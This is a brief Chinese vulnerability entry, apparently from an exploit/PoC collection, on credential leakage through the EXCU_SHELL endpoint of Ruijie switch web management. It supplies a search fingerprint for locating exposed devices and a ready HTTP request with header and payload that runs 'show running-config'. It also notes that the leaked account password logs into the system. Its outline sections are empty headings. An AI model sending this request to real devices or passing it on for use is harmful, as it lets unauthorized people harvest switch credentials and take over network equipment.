# 锐捷交换机WEB管理系统EXCU_SHELL密码信息泄漏漏洞

- **系统**：锐捷　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.body="img/free_login_ge.gif"`
- **请求**：`GET /EXCU_SHELL HTTP/1.1`
- **关键头**：`Cmdnum: 1`

**请求体 / payload**
```
Command1: show running-config
Confirm1: n
Host: xx.xx.xx.xx

使用获取的账号密码成功登录系统\
```

**其他**
- 锐捷交换机WEB管理系统EXCU\_SHELL密码信息泄漏漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 锐捷交换机 WEB 管理系统